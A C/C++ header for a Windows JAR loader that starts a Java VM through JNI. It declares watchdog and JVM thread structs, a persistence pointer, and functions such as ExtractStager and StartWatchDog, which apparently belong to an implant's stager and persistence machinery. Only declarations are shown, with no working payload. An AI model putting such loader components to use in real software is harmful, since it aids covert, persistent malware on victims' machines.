#ifndef _JARLDR_
#define _JARLDR_

#include <Windows.h>
#include <string>
#include "include/jni.h"
#include "../persist.h"

#define COLON ":1"

typedef jint (JNICALL *CreateJavaVM)(JavaVM **pvm, void **penv, void *args);
typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);

/*
 * Struct for starting the watchdog thread
 */
typedef struct {
    unsigned long watchdog_pid;                   
    HANDLE thread_stop_event;
	HANDLE jvm_thread;
	PERSIST_STRUCT *persist_ptr;
} WATCHDOG_THREAD_STRUCT, *PWATCHDOG_THREAD_STRUCT;

/*
 * Struct for starting the watchdog thread
 */
typedef struct {
    unsigned long watchdog_pid;                   
    HANDLE thread_stop_event;
	HANDLE jvm_thread;
	PERSIST_STRUCT *persist_ptr;
} JVM_THREAD_STRUCT, *PJVM_THREAD_STRUCT;

BOOL WINAPI InvokeMain( std::string*, std::string, const char * );
VOID WINAPI InvokeShutdown();
bool ExtractStager( std::string passedPath );
unsigned int __stdcall StartWatchDog(void* a);
BOOL FileExists(std::string aString);

char *GetJvmPath();

#endif